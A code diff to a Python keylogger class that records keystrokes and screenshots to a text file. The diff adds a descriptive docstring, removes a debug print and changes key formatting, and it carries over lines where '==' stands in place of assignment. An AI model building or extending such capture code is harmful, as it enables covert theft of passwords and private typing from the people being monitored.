@@ -14,6 +14,10 @@ class FrequencyTimer(Timer):
             #create timer for program to use on interval
             self.function(*self.args, **self.kwargs)
 
+'''
+This class records keys typed on the keyboard and takes
+screetshots. The captured keys are formated on a text file.
+'''
 class Keylogger:
 
     '''
@@ -25,7 +29,6 @@ class Keylogger:
     def _keyStrike(self, key):
         #open file
         global keylist
-        print("heardsomthing")
         keylist.append(key)
         listSize = 50
         line = ""
@@ -53,13 +56,13 @@ class Keylogger:
             if key == 'Key.space':
                 string = string + key.replace('Key.space', ' ')
             elif key == 'Key.enter':
-                string = string + '\n'
+                string = string + '[ENTER]\n'
             elif key == 'Key.backspace':
                 string == string + " [BS] "
             elif key == 'Key.shift':
                 string == string + " [Sh] "
             else:
-                string = string + key
+                string = string + '{0}'.format(key)
         return string + '\n'
                 
             
